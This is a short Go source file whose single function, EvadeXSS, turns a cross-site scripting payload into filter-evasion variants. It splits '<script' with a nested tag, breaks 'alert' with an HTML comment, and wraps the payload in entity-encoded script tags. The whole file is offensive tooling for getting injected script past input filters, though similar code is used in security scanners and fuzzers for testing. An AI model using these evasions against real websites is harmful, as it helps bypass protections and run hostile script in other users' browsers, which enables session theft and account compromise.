package evasions

import "strings"

func EvadeXSS(payload string) []string {
	variants := []string{
		payload,
		strings.ReplaceAll(payload, "<script", "<scr<script>ipt"),
		strings.ReplaceAll(payload, "alert", "al<!-- -->ert"),
		"&#x3C;script&#x3E;" + payload + "&#x3C;/script&#x3E;",
	}
	return variants
}
